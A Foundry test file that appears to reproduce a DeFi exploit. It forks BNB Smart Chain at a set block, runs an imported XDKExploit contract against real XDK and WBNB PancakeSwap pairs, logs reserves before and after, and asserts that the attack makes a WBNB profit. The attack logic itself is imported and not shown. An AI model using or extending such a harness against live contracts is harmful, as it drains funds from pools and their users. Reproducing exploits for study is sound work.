// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/XDKExploit.sol";

contract XDKExploitTest is Test {
    XDKExploit exploit;

    address constant WBNB       = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant XDK        = 0x02739BE625f7A1Cb196F42dceEe630C394DD9FAA;
    address constant XDK_BASE   = 0xD3c304697f63B279cd314F92c19cDBE5E5b1631A;
    address constant FLASH_PAIR = 0x12dAbFCe08eF59c24cdee6c488E05179Fb8D64D9;
    address constant TARGET_PAIR = 0xe3cBa5C0A8efAeDce84751aF2EFDdCf071D311a9;

    function setUp() public {
        vm.createSelectFork("bsc", 81556792);
        exploit = new XDKExploit();
    }

    function testExploit() public {
        uint256 initWBNB = IERC20(WBNB).balanceOf(address(exploit));
        uint256 initXDKBase = IERC20(XDK_BASE).balanceOf(address(exploit));
        (uint112 r0_target, uint112 r1_target,) = IPancakePair(TARGET_PAIR).getReserves();
        emit log_string("--- XDK/XDK_BASE pair reserves BEFORE ---");
        emit log_named_decimal_uint("  XDK (token0) reserve", r0_target, 18);
        emit log_named_decimal_uint("  XDK_BASE (token1) reserve", r1_target, 18);
        (uint112 r0_flash, uint112 r1_flash,) = IPancakePair(FLASH_PAIR).getReserves();
        emit log_string("--- WBNB/XDK_BASE pair reserves BEFORE ---");
        emit log_named_decimal_uint("  WBNB (token0) reserve", r0_flash, 18);
        emit log_named_decimal_uint("  XDK_BASE (token1) reserve", r1_flash, 18);
        emit log_string("");
        emit log_string("attack...");
        exploit.attack();
        emit log_string("SUCCESS!");
        emit log_string("");

        uint256 finalWBNB = IERC20(WBNB).balanceOf(address(exploit));
        uint256 finalXDKBase = IERC20(XDK_BASE).balanceOf(address(exploit));
        uint256 finalXDK = IERC20(XDK).balanceOf(address(exploit));

        emit log_string("--- Exploit contract balances AFTER ---");
        emit log_named_decimal_uint("  WBNB profit", finalWBNB, 18);
        emit log_named_decimal_uint("  XDK_BASE remaining", finalXDKBase, 18);
        emit log_named_decimal_uint("  XDK remaining", finalXDK, 18);
        emit log_string("");
        (r0_target, r1_target,) = IPancakePair(TARGET_PAIR).getReserves();
        emit log_string("--- XDK/XDK_BASE pair reserves AFTER ---");
        emit log_named_decimal_uint("  XDK (token0) reserve", r0_target, 18);
        emit log_named_decimal_uint("  XDK_BASE (token1) reserve", r1_target, 18);
        emit log_string("");
        uint256 profitWBNB = finalWBNB - initWBNB;
        emit log_named_decimal_uint("  Profit (WBNB)", profitWBNB, 18);
        emit log_string("========================================");

        assertGt(profitWBNB, 0, "Attack should generate WBNB profit");
    }
}
